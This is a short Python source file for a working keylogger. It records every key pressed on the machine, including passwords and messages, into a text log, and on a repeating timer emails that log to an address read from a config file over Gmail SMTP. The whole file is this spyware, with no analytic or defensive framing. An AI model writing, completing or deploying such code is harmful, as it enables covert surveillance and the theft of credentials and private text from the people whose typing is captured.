import keyboard
import smtplib
import config

from threading import Timer
from datetime import datetime


class Keylogger:
    
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method= report_method
        self.log=""

        self.start_time=datetime.now()
        self.enf_time=datetime.now()

    def callback(self, event):
        name = event.name

        if len(name)>1:
            if name == "enter":
                name= "[ENTER]"
            elif name == "space":
                name= " "
            elif name == "decimal":
                name="."
            else:
                name =f"[{name.upper()}]"

        self.log += name
    

    def sendEmail(self, email, password, frome, to, msg):

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(frome, to, msg)
        server.quit()


    def report(self):
        a= config.EMAIL_ADDRESS
        ap= config.EMAIL_PASSWORD
        f=config.FROM
        ab= config.TO

        if self.log:

            self.enf_time=datetime.now()

            if self.report_method =="email":
                self.sendEmail(a, ap, f, ab, self.log)
        self.log=""
        self.start_time=datetime.now()
        taimer= Timer(interval= self.interval, function=self.report)
        taimer.daemon=True
        taimer.start()


    def start(self):
        self.start_time=datetime.now()
        
        keyboard.on_press(callback= self.callback)
        self.report()
        keyboard.wait("F1")

if __name__=="__main__":
    key= Keylogger(interval= config.SEND_REPORT_EVERY, report_method="email")
    key.start()


